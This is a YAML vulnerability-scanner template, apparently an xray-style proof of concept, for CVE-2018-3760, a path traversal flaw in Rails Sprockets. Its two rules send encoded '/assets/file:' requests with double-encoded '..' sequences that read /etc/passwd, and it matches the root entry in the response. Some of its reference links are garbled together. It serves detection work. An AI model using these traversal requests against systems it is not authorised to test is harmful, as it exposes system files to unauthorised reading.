name: yaml-poc-debian-debian_linux-leak-CVE-2018-3760
binding: c5e219e1-e28d-4b58-9750-be854047c9e5
detail:
    author: system_user
    links:
        - https://access.redhat.com/errata/RHSA-2018:2244
        - https://access.redhat.com/errata/RHSA-2018:2245
        - https://access.redhat.com/errata/RHSA-2018:2561
        - https://access.redhat.com/errata/RHSA-2018:2745
        - https://github.com/rails/sprockets/commit/18b8a7f07a50c245e9aee7854ecdbe606bbd8bb5
        - https://github.com/rails/sprockets/commit/9c34fa05900b968d74f08ccf40917848a7be9441
        - https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5f
        - https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5fhttps://github.com/rails/sprockets/commit/9c34fa05900b968d74f08ccf40917848a7be9441https://github.com/rails/sprockets/c
        - https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5fhttps://github.com/rails/sprockets/commit/9c34fa05900b968d74f08ccf40917848a7be9441https://github.com/rails/sprockets/commit/18b8a7f07a50c245e9aee7854ecdbe606bbd8bb5
        - https://groups.google.com/d/msg/rubyonrails-security/ft_J--l55fM/7roDfQ50BwAJ
        - https://www.debian.org/security/2018/dsa-4242
    vulnerability:
        id: e6e84701-41ed-42e0-9488-84ef1bc0cac5
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /assets/file:%2f%2f/etc/passwd
            follow_redirects: false
        expression: response.status == 500 && response.body.bcontains(b"FileOutsidePaths")
        output:
            search: '"/etc/passwd is no longer under a load path: (?P<path>.*?),".bsubmatch(response.body)'
            path: search["path"]
    r1:
        request:
            cache: true
            method: GET
            path: /assets/file:%2f%2f{{path}}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
            follow_redirects: false
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0() && r1()
